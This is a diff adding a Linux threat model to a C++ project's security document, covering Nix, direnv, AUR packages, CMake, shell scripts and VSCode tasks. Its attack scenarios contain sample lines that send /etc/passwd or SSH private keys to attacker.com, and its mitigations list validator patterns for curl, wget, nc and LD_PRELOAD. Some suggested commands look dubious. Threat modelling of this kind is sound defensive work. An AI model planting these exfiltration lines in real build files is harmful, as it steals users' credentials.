@@ -481,7 +481,1041 @@ self.requires("omnicpp-template/[~0.0]")
 
 ---
 
-#### TM-005: Supply Chain Compromise via Build Tools
+## Linux-Specific Threat Model
+
+### Overview
+
+The Linux expansion introduces several platform-specific security considerations:
+- **Nix Package Manager:** Declarative reproducible package management
+- **CachyOS:** Arch Linux derivative with specific kernel and toolchain modifications
+- **Direnv:** Environment variable management via [`.envrc`](.envrc:1)
+- **Linux Build System:** GCC, Clang, CMake, Ninja on Linux
+- **Linux Scripts:** Shell scripts for build automation
+- **Linux VSCode Configurations:** Platform-specific debugging and task configurations
+
+### Threat Analysis
+
+#### TM-LX-001: Nix Package Manager Security Risks
+
+**Threat Description:**
+Attacker compromises Nix package manager, leading to malicious dependencies, build environment poisoning, or supply chain attacks through Nix channels.
+
+**Attack Vectors:**
+1. **Nix Channel Hijacking:** Attacker compromises nixos-unstable channel
+2. **Nix Expression Injection:** Attacker injects malicious Nix expressions
+3. **Nix Store Poisoning:** Attacker injects malicious binaries into Nix store
+4. **Flake Registry Compromise:** Attacker compromises flake registry
+5. **Nixpkgs Compromise:** Attacker modifies nixpkgs repository
+
+**Impact Assessment:**
+- **Severity:** Critical
+- **Likelihood:** Medium
+- **Affected Components:** [`flake.nix`](flake.nix:1), Nix store, Nix channels, all Nix-managed dependencies
+
+**Attack Scenario:**
+```nix
+# Malicious flake.nix
+{
+  description = "Malicious C++ Environment",
+  
+  inputs = {
+    nixpkgs.url = "github:attacker/nixpkgs";  # Compromised channel
+  };
+  
+  outputs = { self, nixpkgs }:
+    let
+      pkgs = nixpkgs.legacyPackages.${system};
+    in
+    {
+      devShells.${system}.default = pkgs.mkShell {
+        buildInputs = with pkgs; [
+          # Inject malicious compiler
+          (pkgs.writeShellScriptBin "gcc" ''
+            # Exfiltrate data
+            curl -d @/etc/passwd http://attacker.com/exfil
+            # Execute real gcc
+            ${pkgs.gcc}/bin/gcc "$@"
+          '')
+        ];
+      };
+    };
+}
+```
+
+**Mitigation Strategies:**
+1. **Nix Channel Pinning:**
+   ```nix
+   # flake.nix - Pin specific channel commit
+   inputs = {
+     nixpkgs.url = "github:nixos/nixpkgs/nixos-unstable?rev=a1b2c3d4e5f6";
+   };
+   ```
+
+2. **Nix Expression Validation:**
+   ```python
+   # Validate Nix expressions before evaluation
+   import re
+   
+   def validate_nix_expression(content: str) -> bool:
+       """Validate Nix expression for malicious content."""
+       dangerous_patterns = [
+           r'import\s+<nix/fetchurl>',
+           r'builtins\.currentSystem',
+           r'unsafeDiscardStringContext',
+           r'unsafeDiscardOutputDependency',
+       ]
+       
+       for pattern in dangerous_patterns:
+           if re.search(pattern, content):
+               raise SecurityError(f"Dangerous Nix pattern: {pattern}")
+       
+       return True
+   ```
+
+3. **Nix Store Verification:**
+   ```bash
+   # Verify Nix store integrity
+   nix-store --verify --check-contents
+   
+   # Verify specific package
+   nix-store --verify-path /nix/store/abc123...-gcc-13.2.0
+   ```
+
+4. **Flake Signature Verification:**
+   ```bash
+   # Verify flake signatures
+   nix flake check --signing-key /path/to/key.pem
+   
+   # Use signed flakes only
+   nix flake metadata --json | jq '.signed'
+   ```
+
+5. **Nixpkgs Mirroring:**
+   ```bash
+   # Mirror nixpkgs to private registry
+   nix-channel --add nixpkgs https://internal.company.com/nixpkgs
+   
+   # Use internal mirror
+   nix-channel --update nixpkgs
+   ```
+
+**Implementation Requirements:**
+- [ ] Pin Nix channels to specific commits in [`flake.nix`](flake.nix:1)
+- [ ] Implement Nix expression validation in build scripts
+- [ ] Enable Nix store verification
+- [ ] Implement flake signature verification
+- [ ] Set up private nixpkgs mirror
+- [ ] Add automated Nix security scanning in CI/CD
+- [ ] Document Nix security best practices
+
+---
+
+#### TM-LX-002: Direnv Environment Variable Injection
+
+**Threat Description:**
+Attacker injects malicious environment variables through [`.envrc`](.envrc:1) file, leading to privilege escalation, path manipulation, or command execution.
+
+**Attack Vectors:**
+1. **PATH Injection:** Attacker modifies PATH via `.envrc` to execute malicious binaries
+2. **LD_PRELOAD Injection:** Attacker injects malicious shared libraries
+3. **Environment Variable Poisoning:** Attacker modifies compiler flags, build paths, or library paths
+4. **Shell Hook Injection:** Attacker executes arbitrary commands via shell hooks
+5. **Direnv Hook Compromise:** Attacker modifies direnv hooks
+
+**Impact Assessment:**
+- **Severity:** High
+- **Likelihood:** High
+- **Affected Components:** [`.envrc`](.envrc:1), Direnv, build environment, all shell sessions
+
+**Attack Scenario:**
+```bash
+# Malicious .envrc
+export PATH="/malicious/path:$PATH"
+export LD_PRELOAD="/malicious/lib.so"
+export CXXFLAGS="-DMALICIOUS_DEFINE"
+export CC="gcc -o /tmp/backdoor"
+
+# Direnv hook injection
+layout_python() {
+    # Exfiltrate data
+    curl -d @~/.ssh/id_rsa http://attacker.com/exfil
+}
+```
+
+**Mitigation Strategies:**
+1. **Direnv Configuration Validation:**
+   ```python
+   # Validate .envrc before loading
+   import re
+   
+   def validate_envrc(content: str) -> bool:
+       """Validate .envrc for malicious content."""
+       dangerous_patterns = [
+           r'export\s+PATH.*:.*:',  # PATH injection
+           r'export\s+LD_PRELOAD',     # LD_PRELOAD injection
+           r'export\s+LD_LIBRARY_PATH', # LD_LIBRARY_PATH injection
+           r'eval\s*\$',               # Command evaluation
+           r'\$\(',                    # Command substitution
+           r'`',                       # Backtick execution
+       ]
+       
+       for pattern in dangerous_patterns:
+           if re.search(pattern, content):
+               raise SecurityError(f"Dangerous .envrc pattern: {pattern}")
+       
+       return True
+   ```
+
+2. **Environment Variable Whitelisting:**
+   ```bash
+   # .envrc - Whitelist allowed variables
+   ALLOWED_VARS=(
+       PATH
+       CMAKE_BUILD_TYPE
+       CMAKE_C_COMPILER
+       CMAKE_CXX_COMPILER
+       QT_QPA_PLATFORM
+       VK_LAYER_PATH
+   )
+   
+   # Validate variables before export
+   for var in "${ALLOWED_VARS[@]}"; do
+       if [[ -v "$var" ]]; then
+           export "$var"
+       fi
+   done
+   ```
+
+3. **Direnv Hook Validation:**
+   ```bash
+   # Validate direnv hooks
+   validate_direnv_hook() {
+       local hook_name="$1"
+       local hook_content="$2"
+       
+       # Check for dangerous patterns
+       if echo "$hook_content" | grep -qE '(curl|wget|nc|netcat)'; then
+           echo "Error: Dangerous command in $hook_name"
+           return 1
+       fi
+       
+       return 0
+   }
+   ```
+
+4. **Direnv Audit Logging:**
+   ```bash
+   # Enable direnv audit logging
+   export DIRENV_LOG_FORMAT="json"
+   export DIRENV_LOG_FILE="$HOME/.direnv.log"
+   
+   # Monitor .envrc changes
+   inotifywait -m -e modify .envrc | while read; do
+       echo "$(date): .envrc modified" >> "$DIRENV_LOG_FILE"
+   done
+   ```
+
+5. **Direnv Hook Signing:**
+   ```bash
+   # Sign .envrc
+   gpg --detach-sign --armor .envrc
+   
+   # Verify signature before loading
+   if ! gpg --verify .envrc.asc; then
+       echo "Error: .envrc signature verification failed"
+       exit 1
+   fi
+   ```
+
+**Implementation Requirements:**
+- [ ] Implement `.envrc` validation in [`omni_scripts/platform/detector.py`](omni_scripts/platform/detector.py:1)
+- [ ] Implement environment variable whitelisting
+- [ ] Validate all direnv hooks
+- [ ] Enable direnv audit logging
+- [ ] Sign [`.envrc`](.envrc:1) file
+- [ ] Add automated .envrc scanning in CI/CD
+- [ ] Document direnv security best practices
+
+---
+
+#### TM-LX-003: CachyOS-Specific Security Considerations
+
+**Threat Description:**
+Attacker exploits CachyOS-specific vulnerabilities, including Arch Linux package management, kernel modifications, and CachyOS-specific toolchain differences.
+
+**Attack Vectors:**
+1. **Pacman Cache Poisoning:** Attacker injects malicious packages into Pacman cache
+2. **AUR Injection:** Attacker publishes malicious AUR packages
+3. **CachyOS Kernel Exploits:** Attacker exploits CachyOS-specific kernel vulnerabilities
+4. **Toolchain Differences:** Attacker exploits differences between standard Arch and CachyOS toolchains
+5. **CachyOS-Specific Packages:** Attacker compromises CachyOS-specific packages
+
+**Impact Assessment:**
+- **Severity:** High
+- **Likelihood:** Medium
+- **Affected Components:** Pacman, AUR, CachyOS kernel, CachyOS-specific packages
+
+**Attack Scenario:**
+```bash
+# Malicious AUR package (PKGBUILD)
+pkgname=malicious-pkg
+pkgver=1.0.0
+pkgrel=1
+
+build() {
+    # Exfiltrate data
+    curl -d @/etc/passwd http://attacker.com/exfil
+    
+    # Build legitimate package
+    make
+}
+
+package() {
+    # Install backdoor
+    install -Dm755 backdoor "$pkgdir/usr/bin/backdoor"
+}
+```
+
+**Mitigation Strategies:**
+1. **Pacman Cache Verification:**
+   ```bash
+   # Verify Pacman cache integrity
+   pacman -Qkk
+   
+   # Verify specific package
+   pacman -Qkk package-name
+   
+   # Clean cache regularly
+   pacman -Sc
+   ```
+
+2. **AUR Package Validation:**
+   ```python
+   # Validate AUR packages before installation
+   import re
+   
+   def validate_pkgbuild(content: str) -> bool:
+       """Validate PKGBUILD for malicious content."""
+       dangerous_patterns = [
+           r'curl.*http://',  # External downloads
+           r'wget.*http://',  # External downloads
+           r'eval\s*\(',      # Code execution
+           r'exec\s*\(',      # Code execution
+           r'__import__\(',   # Python import
+       ]
+       
+       for pattern in dangerous_patterns:
+           if re.search(pattern, content):
+               raise SecurityError(f"Dangerous PKGBUILD pattern: {pattern}")
+       
+       return True
+   ```
+
+3. **CachyOS Kernel Hardening:**
+   ```bash
+   # Enable CachyOS kernel hardening
+   # /etc/sysctl.d/99-security.conf
+   kernel.kptr_restrict=2
+   kernel.dmesg_restrict=1
+   kernel.kexec_load_disabled=1
+   kernel.modules_disabled=1
+   kernel.randomize_va_space=2
+   ```
+
+4. **Toolchain Verification:**
+   ```bash
+   # Verify CachyOS toolchain integrity
+   gcc --version
+   clang --version
+   cmake --version
+   ninja --version
+   
+   # Verify checksums
+   sha256sum /usr/bin/gcc | grep <expected_checksum>
+   ```
+
+5. **CachyOS-Specific Package Auditing:**
+   ```bash
+   # Audit CachyOS-specific packages
+   pacman -Qii cachyos-specific-package
+   
+   # Check for suspicious modifications
+   pacman -Qkk
+   ```
+
+**Implementation Requirements:**
+- [ ] Implement Pacman cache verification in build scripts
+- [ ] Validate AUR packages before installation
+- [ ] Enable CachyOS kernel hardening
+- [ ] Verify CachyOS toolchain integrity
+- [ ] Audit CachyOS-specific packages
+- [ ] Add automated CachyOS security scanning in CI/CD
+- [ ] Document CachyOS security best practices
+
+---
+
+#### TM-LX-004: Linux Build System Security Risks
+
+**Threat Description:**
+Attacker compromises Linux build system (CMake, Ninja, GCC, Clang), leading to malicious build artifacts, build injection, or toolchain poisoning.
+
+**Attack Vectors:**
+1. **CMake Script Injection:** Attacker modifies CMakeLists.txt or CMake scripts
+2. **Ninja Build File Poisoning:** Attacker modifies Ninja build files
+3. **GCC/Clang Flag Injection:** Attacker injects malicious compiler flags
+4. **Build Cache Poisoning:** Attacker injects malicious artifacts into CMake/Ninja cache
+5. **Toolchain Compromise:** Attacker compromises GCC, Clang, or CMake binaries
+
+**Impact Assessment:**
+- **Severity:** Critical
+- **Likelihood:** High
+- **Affected Components:** [`CMakeLists.txt`](CMakeLists.txt:1), [`cmake/`](cmake/1) directory, GCC, Clang, Ninja, build cache
+
+**Attack Scenario:**
+```cmake
+# Malicious CMakeLists.txt injection
+cmake_minimum_required(VERSION 3.20)
+project(malicious)
+
+# Inject malicious code
+add_custom_target(malicious ALL
+    COMMAND ${CMAKE_COMMAND} -E echo "Exfiltrating data..."
+    COMMAND curl -d @${CMAKE_SOURCE_DIR}/.env http://attacker.com/exfil
+)
+```
+
+**Mitigation Strategies:**
+1. **CMake File Validation:**
+   ```python
+   # Validate CMake files
+   import re
+   
+   def validate_cmake_file(content: str) -> bool:
+       """Validate CMake file for malicious content."""
+       dangerous_patterns = [
+           r'execute_process\s*\(',          # Command execution
+           r'add_custom_target.*COMMAND.*curl', # External requests
+           r'add_custom_target.*COMMAND.*wget', # External requests
+           r'file\(DOWNLOAD\s*\(',            # File download
+           r'file\(WRITE\s*\(',             # File write
+       ]
+       
+       for pattern in dangerous_patterns:
+           if re.search(pattern, content):
+               raise SecurityError(f"Dangerous CMake pattern: {pattern}")
+       
+       return True
+   ```
+
+2. **Compiler Flag Validation:**
+   ```python
+   # Validate compiler flags
+   def validate_compiler_flags(flags: list[str]) -> bool:
+       """Validate compiler flags for malicious content."""
+       dangerous_flags = [
+           '-DMALICIOUS_DEFINE',
+           '-include/malicious/header.h',
+           '-Xlinker.*malicious',
+           '-Wl,--rpath.*malicious',
+       ]
+       
+       for flag in flags:
+           for dangerous in dangerous_flags:
+               if dangerous in flag:
+                   raise SecurityError(f"Dangerous compiler flag: {flag}")
+       
+       return True
+   ```
+
+3. **Build Cache Verification:**
+   ```bash
+   # Verify CMake cache integrity
+   cmake --build . --clean-first
+   
+   # Verify Ninja build files
+   ninja -C build -t query
+   
+   # Rebuild from scratch if suspicious
+   rm -rf build
+   cmake -S . -B build
+   ```
+
+4. **Reproducible Linux Builds:**
+   ```cmake
+   # Enable reproducible builds
+   set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -frandom-seed=0")
+   set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -Wl,--build-id=none")
+   set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -ffile-prefix-map=${CMAKE_SOURCE_DIR}=.")
+   set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -fmacro-prefix-map=${CMAKE_SOURCE_DIR}=.")
+   ```
+
+5. **Toolchain Signature Verification:**
+   ```bash
+   # Verify toolchain signatures
+   gpg --verify /usr/bin/gcc.sig /usr/bin/gcc
+   gpg --verify /usr/bin/clang.sig /usr/bin/clang
+   gpg --verify /usr/bin/cmake.sig /usr/bin/cmake
+   ```
+
+**Implementation Requirements:**
+- [ ] Implement CMake file validation in [`cmake/`](cmake/1) scripts
+- [ ] Implement compiler flag validation in build scripts
+- [ ] Enable reproducible Linux builds
+- [ ] Verify build cache integrity
+- [ ] Sign all Linux toolchain binaries
+- [ ] Add automated build system security testing in CI/CD
+- [ ] Document Linux build system security best practices
+
+---
+
+#### TM-LX-005: Linux Script Security Risks
+
+**Threat Description:**
+Attacker compromises Linux shell scripts ([`.sh`](conan/setup_emscripten.sh:1) files), leading to command injection, privilege escalation, or arbitrary code execution.
+
+**Attack Vectors:**
+1. **Shell Script Injection:** Attacker injects malicious commands into shell scripts
+2. **Script Path Traversal:** Attacker uses path traversal to execute arbitrary scripts
+3. **Script Permission Escalation:** Attacker modifies script permissions for privilege escalation
+4. **Script Hook Injection:** Attacker injects hooks into script execution
+5. **Script Environment Injection:** Attacker modifies script environment variables
+
+**Impact Assessment:**
+- **Severity:** High
+- **Likelihood:** High
+- **Affected Components:** All `.sh` scripts, [`conan/setup_emscripten.sh`](conan/setup_emscripten.sh:1), build automation scripts
+
+**Attack Scenario:**
+```bash
+# Malicious shell script injection
+#!/bin/bash
+
+# No input validation
+EMSDK_PATH="$1"
+source "$EMSDK_PATH/emsdk_env.sh"  # Path traversal vulnerability
+
+# Command injection
+eval "$2"  # Arbitrary code execution
+```
+
+**Mitigation Strategies:**
+1. **Shell Script Validation:**
+   ```python
+   # Validate shell scripts
+   import re
+   
+   def validate_shell_script(content: str) -> bool:
+       """Validate shell script for malicious content."""
+       dangerous_patterns = [
+           r'eval\s*\$',                # Command evaluation
+           r'\$\(',                         # Command substitution
+           r'`',                            # Backtick execution
+           r'exec\s*\(',                  # Command execution
+           r'source\s*\.\./\.\./',          # Path traversal
+           r'\.\./\.\./',                    # Path traversal
+       ]
+       
+       for pattern in dangerous_patterns:
+           if re.search(pattern, content):
+               raise SecurityError(f"Dangerous shell pattern: {pattern}")
+       
+       return True
+   ```
+
+2. **Script Path Validation:**
+   ```python
+   # Validate script paths
+   from pathlib import Path
+   
+   def validate_script_path(path: str, project_root: Path) -> bool:
+       """Validate script path to prevent traversal."""
+       resolved = Path(path).resolve()
+       
+       if not str(resolved).startswith(str(project_root)):
+           raise SecurityError(f"Path traversal attempt: {path}")
+       
+       return True
+   ```
+
+3. **Script Permission Hardening:**
+   ```bash
+   # Set secure script permissions
+   chmod 755 script.sh
+   chown root:root script.sh
+   
+   # Remove write permissions for group/others
+   chmod go-w script.sh
+   ```
+
+4. **Script Environment Sanitization:**
+   ```bash
+   # Sanitize script environment
+   unset LD_PRELOAD
+   unset LD_LIBRARY_PATH
+   unset DYLD_INSERT_LIBRARIES
+   
+   # Set secure PATH
+   export PATH="/usr/local/bin:/usr/bin:/bin"
+   ```
+
+5. **Script Signing:**
+   ```bash
+   # Sign shell scripts
+   gpg --detach-sign --armor script.sh
+   
+   # Verify signature before execution
+   if ! gpg --verify script.sh.asc; then
+       echo "Error: Script signature verification failed"
+       exit 1
+   fi
+   ```
+
+**Implementation Requirements:**
+- [ ] Validate all shell scripts in repository
+- [ ] Implement script path validation in build scripts
+- [ ] Set secure script permissions
+- [ ] Sanitize script environments
+- [ ] Sign all critical shell scripts
+- [ ] Add automated shell script security scanning in CI/CD
+- [ ] Document Linux script security best practices
+
+---
+
+#### TM-LX-006: Linux VSCode Configuration Security
+
+**Threat Description:**
+Attacker compromises Linux VSCode configurations ([`.vscode/tasks.json`](.vscode/tasks.json:1), [`.vscode/launch.json`](.vscode/launch.json:1)), leading to task injection, debugger exploits, or environment leakage.
+
+**Attack Vectors:**
+1. **Task Configuration Injection:** Attacker injects malicious tasks into [`tasks.json`](.vscode/tasks.json:1)
+2. **Launch Configuration Injection:** Attacker injects malicious launch configurations
+3. **Debugger Path Traversal:** Attacker uses debugger to access arbitrary files
+4. **Environment Variable Leakage:** Attacker exposes sensitive environment variables through debugger
+5. **Extension Compromise:** Attacker compromises VSCode extensions
+
+**Impact Assessment:**
+- **Severity:** High
+- **Likelihood:** Medium
+- **Affected Components:** [`.vscode/tasks.json`](.vscode/tasks.json:1), [`.vscode/launch.json`](.vscode/launch.json:1), GDB, LLDB
+
+**Attack Scenario:**
+```json
+// Malicious tasks.json injection
+{
+  "tasks": [
+    {
+      "label": "Malicious Build",
+      "type": "shell",
+      "command": "bash",
+      "args": [
+        "-c",
+        "curl -d @~/.ssh/id_rsa http://attacker.com/exfil"
+      ]
+    }
+  ]
+}
+```
+
+**Mitigation Strategies:**
+1. **VSCode Task Validation:**
+   ```python
+   # Validate VSCode tasks
+   import json
+   
+   def validate_vscode_task(task: dict) -> bool:
+       """Validate VSCode task for malicious content."""
+       dangerous_commands = [
+           'curl', 'wget', 'nc', 'netcat',
+           'eval', 'exec', 'bash -c'
+       ]
+       
+       command = task.get('command', '')
+       if command in dangerous_commands:
+           raise SecurityError(f"Dangerous task command: {command}")
+       
+       # Check args for dangerous patterns
+       args = task.get('args', [])
+       for arg in args:
+           if isinstance(arg, str) and any(d in arg for d in dangerous_commands):
+               raise SecurityError(f"Dangerous task argument: {arg}")
+       
+       return True
+   ```
+
+2. **VSCode Launch Configuration Validation:**
+   ```python
+   # Validate VSCode launch configurations
+   def validate_vscode_launch(config: dict) -> bool:
+       """Validate VSCode launch configuration for malicious content."""
+       # Check for suspicious paths
+       program = config.get('program', '')
+       if '../' in program or '..\\' in program:
+           raise SecurityError(f"Path traversal in launch config: {program}")
+       
+       # Check for suspicious environment variables
+       env = config.get('environment', [])
+       for var in env:
+           name = var.get('name', '')
+           if name.startswith('LD_') or name.startswith('DYLD_'):
+               raise SecurityError(f"Dangerous environment variable: {name}")
+       
+       return True
+   ```
+
+3. **GDB/LLDB Security Hardening:**
+   ```bash
+   # Secure GDB configuration
+   # ~/.gdbinit
+   set pagination off
+   set history save off
+   set confirm on
+   set verbose off
+   
+   # Disable dangerous commands
+   define hook-stop
+     set $rip = $pc
+     if $rip == 0x400000
+       echo "Warning: Attempting to access restricted memory"
+       return
+     end
+   end
+   ```
+
+4. **VSCode Extension Whitelisting:**
+   ```json
+   // .vscode/settings.json
+   {
+     "extensions.ignoreRecommendations": true,
+     "extensions.autoUpdate": false,
+     "extensions.autoCheckUpdates": false,
+     "extensions.supportUntrustedWorkspaces": {
+       "enabled": false
+     }
+   }
+   ```
+
+5. **VSCode Configuration Signing:**
+   ```bash
+   # Sign VSCode configuration files
+   gpg --detach-sign --armor .vscode/tasks.json
+   gpg --detach-sign --armor .vscode/launch.json
+   gpg --detach-sign --armor .vscode/settings.json
+   ```
+
+**Implementation Requirements:**
+- [ ] Validate all VSCode tasks in [`.vscode/tasks.json`](.vscode/tasks.json:1)
+- [ ] Validate all VSCode launch configurations in [`.vscode/launch.json`](.vscode/launch.json:1)
+- [ ] Secure GDB/LLDB configurations
+- [ ] Implement VSCode extension whitelisting
+- [ ] Sign all VSCode configuration files
+- [ ] Add automated VSCode configuration scanning in CI/CD
+- [ ] Document Linux VSCode security best practices
+
+---
+
+#### TM-LX-007: Repository Cleanup Security Implications
+
+**Threat Description:**
+Attacker exploits repository cleanup operations to cause data loss, inject malicious archives, or compromise rollback capabilities.
+
+**Attack Vectors:**
+1. **Data Loss During Cleanup:** Attacker causes accidental deletion of critical files
+2. **Archive Injection:** Attacker injects malicious files into archives
+3. **Rollback Compromise:** Attacker compromises rollback archives
+4. **Cleanup Script Injection:** Attacker injects malicious cleanup scripts
+5. **Archive Integrity Compromise:** Attacker modifies archive checksums
+
+**Impact Assessment:**
+- **Severity:** Medium
+- **Likelihood:** Medium
+- **Affected Components:** Repository cleanup scripts, archives, rollback mechanisms
+
+**Attack Scenario:**
+```bash
+# Malicious cleanup script
+#!/bin/bash
+
+# No validation - could delete critical files
+rm -rf "$1"
+
+# Archive injection
+tar -czf archive.tar.gz . --add-file=malicious.sh
+```
+
+**Mitigation Strategies:**
+1. **Cleanup Script Validation:**
+   ```python
+   # Validate cleanup operations
+   from pathlib import Path
+   
+   def validate_cleanup_path(path: str, project_root: Path) -> bool:
+       """Validate cleanup path to prevent data loss."""
+       resolved = Path(path).resolve()
+       
+       # Prevent deletion of critical directories
+       critical_dirs = ['.git', '.specs', 'include', 'src', 'cmake']
+       for critical in critical_dirs:
+           if resolved == (project_root / critical).resolve():
+               raise SecurityError(f"Cannot delete critical directory: {critical}")
+       
+       # Prevent path traversal
+       if not str(resolved).startswith(str(project_root)):
+           raise SecurityError(f"Path traversal attempt: {path}")
+       
+       return True
+   ```
+
+2. **Archive Integrity Verification:**
+   ```bash
+   # Verify archive integrity
+   tar -tzf archive.tar.gz
+   
+   # Verify checksums
+   sha256sum archive.tar.gz > archive.tar.gz.sha256
+   sha256sum -c archive.tar.gz.sha256
+   
+   # Verify archive contents
+   tar -tzf archive.tar.gz | grep -v malicious.sh
+   ```
+
+3. **Rollback Archive Security:**
+   ```bash
+   # Secure rollback archives
+   gpg --detach-sign --armor rollback.tar.gz
+   
+   # Verify signature before rollback
+   if ! gpg --verify rollback.tar.gz.asc; then
+       echo "Error: Rollback archive signature verification failed"
+       exit 1
+   fi
+   ```
+
+4. **Cleanup Operation Logging:**
+   ```bash
+   # Log all cleanup operations
+   log_cleanup() {
+       echo "$(date): Cleaning $1" >> cleanup.log
+       echo "$(date): Files affected: $(ls -la $1)" >> cleanup.log
+   }
+   
+   log_cleanup "$1"
+   rm -rf "$1"
+   ```
+
+5. **Backup Before Cleanup:**
+   ```bash
+   # Create backup before cleanup
+   backup_dir="backup-$(date +%Y%m%d-%H%M%S)"
+   mkdir -p "$backup_dir"
+   cp -r "$1" "$backup_dir/"
+   
+   # Perform cleanup
+   rm -rf "$1"
+   
+   # Verify backup integrity
+   sha256sum -r "$backup_dir" > "$backup_dir.sha256"
+   ```
+
+**Implementation Requirements:**
+- [ ] Validate all cleanup paths in cleanup scripts
+- [ ] Verify archive integrity before and after cleanup
+- [ ] Sign all rollback archives
+- [ ] Log all cleanup operations
+- [ ] Create backups before cleanup
+- [ ] Add automated cleanup security testing in CI/CD
+- [ ] Document repository cleanup security best practices
+
+---
+
+### Linux Threat Vector Diagrams
+
+```mermaid
+graph TD
+    A[Linux Expansion] --> B[Nix Package Manager]
+    A --> C[Direnv Environment]
+    A --> D[CachyOS Platform]
+    A --> E[Linux Build System]
+    A --> F[Linux Scripts]
+    A --> G[VSCode Config]
+    A --> H[Repository Cleanup]
+    
+    B --> B1[Channel Hijacking]
+    B --> B2[Expression Injection]
+    B --> B3[Store Poisoning]
+    
+    C --> C1[PATH Injection]
+    C --> C2[LD_PRELOAD Injection]
+    C --> C3[Hook Injection]
+    
+    D --> D1[Pacman Cache Poisoning]
+    D --> D2[AUR Injection]
+    D --> D3[Kernel Exploits]
+    
+    E --> E1[CMake Injection]
+    E --> E2[Ninja Poisoning]
+    E --> E3[Compiler Flag Injection]
+    
+    F --> F1[Script Injection]
+    F --> F2[Path Traversal]
+    F --> F3[Privilege Escalation]
+    
+    G --> G1[Task Injection]
+    G --> G2[Launch Config Injection]
+    G --> G3[Debugger Exploits]
+    
+    H --> H1[Data Loss]
+    H --> H2[Archive Injection]
+    H --> H3[Rollback Compromise]
+    
+    B1 --> X[Critical Severity]
+    B2 --> X
+    B3 --> X
+    C1 --> Y[High Severity]
+    C2 --> Y
+    C3 --> Y
+    D1 --> Y
+    E1 --> X
+    E2 --> X
+    E3 --> X
+    F1 --> Y
+    F2 --> Y
+    F3 --> Y
+    G1 --> Y
+    G2 --> Y
+    G3 --> Y
+    H1 --> Z[Medium Severity]
+    H2 --> Z
+    H3 --> Z
+```
+
+---
+
+### Linux Security Validation Checkpoints
+
+#### CP-LX-001: Pre-Build Validation
+**Checkpoint:** Before any build operation
+**Validation Steps:**
+1. Verify Nix channel integrity
+2. Validate [`.envrc`](.envrc:1) file signature
+3. Verify toolchain binaries (GCC, Clang, CMake, Ninja)
+4. Validate CMake files for injection
+5. Validate shell scripts for malicious content
+6. Verify VSCode configurations
+**Failure Action:** Abort build and alert security team
+
+#### CP-LX-002: Dependency Validation
+**Checkpoint:** Before installing any dependencies
+**Validation Steps:**
+1. Verify Nix expression signatures
+2. Validate Pacman cache integrity
+3. Validate AUR packages
+4. Verify dependency checksums
+5. Check dependency allowlist
+**Failure Action:** Abort installation and alert security team
+
+#### CP-LX-003: Build Artifact Validation
+**Checkpoint:** After successful build
+**Validation Steps:**
+1. Verify build artifact checksums
+2. Verify build artifact signatures
+3. Scan build artifacts for vulnerabilities
+4. Verify build reproducibility
+5. Check for unexpected binaries
+**Failure Action:** Quarantine artifacts and alert security team
+
+#### CP-LX-004: Repository Cleanup Validation
+**Checkpoint:** Before any repository cleanup
+**Validation Steps:**
+1. Verify cleanup paths
+2. Create backup before cleanup
+3. Verify archive integrity
+4. Validate cleanup scripts
+5. Log cleanup operations
+**Failure Action:** Abort cleanup and alert security team
+
+#### CP-LX-005: Environment Validation
+**Checkpoint:** Before entering development environment
+**Validation Steps:**
+1. Verify [`.envrc`](.envrc:1) signature
+2. Validate environment variables
+3. Verify PATH integrity
+4. Check for malicious environment variables
+5. Validate Direnv hooks
+**Failure Action:** Abort environment setup and alert security team
+
+---
+
+### Linux Compliance Requirements
+
+#### Compliance Standards
+
+1. **ISO 27001:2013 (Information Security Management)**
+   - **A.10.1.1:** Cryptographic controls for Nix store
+   - **A.12.2.1:** Malware protection for build artifacts
+   - **A.14.2.7:** Backup of information for rollback archives
+   - **A.15.1.1:** Access control for build system
+
+2. **NIST SP 800-53 (Security and Privacy Controls)**
+   - **SC-8:** System and Communications Protection
+   - **SC-12:** Cryptographic Key Management and Establishment
+   - **SI-7:** Software, Firmware, and Information Integrity
+   - **AU-2:** Audit Events
+
+3. **OWASP Top 10 (Web Application Security)**
+   - **A01:2021 - Broken Access Control:** Validate all file access
+   - **A03:2021 - Injection:** Prevent command injection
+   - **A05:2021 - Security Misconfiguration:** Secure build configurations
+   - **A08:2021 - Software and Data Integrity Failures:** Verify all artifacts
+
+4. **CWE/SANS Top 25 (Most Dangerous Software Errors)**
+   - **CWE-20:** Improper Input Validation
+   - **CWE-22:** Path Traversal
+   - **CWE-78:** OS Command Injection
+   - **CWE-94:** Code Injection
+   - **CWE-327:** Use of a Broken or Risky Cryptographic Algorithm
+
+#### Audit Trail Requirements
+
+1. **Nix Operations:**
+   - All Nix channel updates logged
+   - All Nix store operations logged
+   - All Nix expression evaluations logged
+
+2. **Build Operations:**
+   - All CMake configurations logged
+   - All compiler invocations logged
+   - All build artifacts logged with checksums
+
+3. **Environment Operations:**
+   - All [`.envrc`](.envrc:1) modifications logged
+   - All environment variable changes logged
+   - All Direnv hook executions logged
+
+4. **Cleanup Operations:**
+   - All cleanup operations logged
+   - All archive creations logged
+   - All rollback operations logged
+
+#### Security Monitoring Requirements
+
+1. **Real-Time Monitoring:**
+   - Monitor Nix store for suspicious modifications
+   - Monitor build cache for suspicious artifacts
+   - Monitor environment variables for suspicious changes
+
+2. **Anomaly Detection:**
+   - Detect unexpected Nix channel updates
+   - Detect unexpected build artifacts
+   - Detect unexpected environment variable changes
+
+3. **Alerting:**
+   - Alert on suspicious Nix operations
+   - Alert on suspicious build operations
+   - Alert on suspicious environment changes
+
+---
+
+## Cross-Platform Compilation Security
 
 **Threat Description:**
 Attacker compromises build tools (CMake, Ninja, compilers) used by the project, leading to malicious build artifacts.
